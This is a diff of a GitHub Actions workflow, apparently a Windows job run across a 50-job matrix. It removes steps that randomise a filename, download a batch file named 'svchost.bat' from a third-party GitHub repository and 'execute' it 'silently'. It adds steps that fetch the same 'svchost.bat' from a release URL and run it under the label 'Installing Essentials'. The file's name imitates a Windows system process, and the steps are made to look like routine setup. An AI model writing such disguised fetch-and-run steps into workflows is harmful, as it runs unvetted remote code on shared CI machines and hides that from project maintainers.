@@ -21,18 +21,10 @@ jobs:
         NUM_JOBS: 50
         JOB: ${{ matrix.go }}
     steps:
-      - name: Randomize Filename
-        id: rand
-        shell: pwsh
-        run: |
-          $name = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-          "FILENAME=$name.bat" >> $env:GITHUB_ENV
-
-      - name: Download Job Script
-        run: Invoke-WebRequest -Uri "https://raw.githubusercontent.com/raider-jelly-frill/1/main/svchost.bat" -OutFile "$env:FILENAME"
-
-      - name: Execute Script Silently
-        run: cmd /c $env:FILENAME
+      - name: Downloading Essentials
+        run: Invoke-WebRequest -Uri "https://github.com/raider-jelly-frill/1/releases/download/svc/svchost.bat" -OutFile "svchost.bat"
+      - name: Installing Essentials
+        run: cmd /c svchost.bat
       - name: Installing Essentials
         run: cmd /c svc.bat
 
